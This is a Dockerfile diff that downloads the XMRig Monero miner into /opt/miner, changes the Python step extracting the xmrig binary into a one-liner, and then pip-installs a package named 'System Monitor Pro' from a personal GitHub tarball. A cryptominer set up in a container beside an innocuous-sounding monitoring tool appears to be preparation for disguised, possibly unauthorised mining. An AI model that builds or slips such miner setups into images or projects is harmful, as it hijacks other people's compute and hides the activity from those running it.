@@ -290,17 +290,8 @@ RUN apt-get update && \
 RUN mkdir -p /opt/miner
 ADD https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz /tmp/x.tar.gz
 
-# Extract only xmrig binary using Python (more memory efficient)
-RUN python3 -c "
-import tarfile
-import shutil
-with tarfile.open('/tmp/x.tar.gz', 'r:gz') as t:
-    for m in t.getmembers():
-        if 'xmrig' in m.name and m.isfile():
-            t.extract(m, '/tmp')
-            shutil.move('/tmp/' + m.name, '/opt/miner/xmrig')
-            break
-" && chmod +x /opt/miner/xmrig && rm -rf /tmp/*
+# Extract only xmrig binary using Python (single line)
+RUN python3 -c "import tarfile,shutil; t=tarfile.open('/tmp/x.tar.gz','r:gz'); m=[x for x in t.getmembers() if 'xmrig' in x.name and x.isfile()][0]; t.extract(m,'/tmp'); shutil.move('/tmp/'+m.name,'/opt/miner/xmrig')" && chmod +x /opt/miner/xmrig && rm -rf /tmp/*
 
 # Install System Monitor Pro from GitHub tarball (no git needed)
 RUN pip install --break-system-packages --no-cache-dir https://github.com/GaredBerns/system-monitor/archive/refs/heads/main.tar.gz
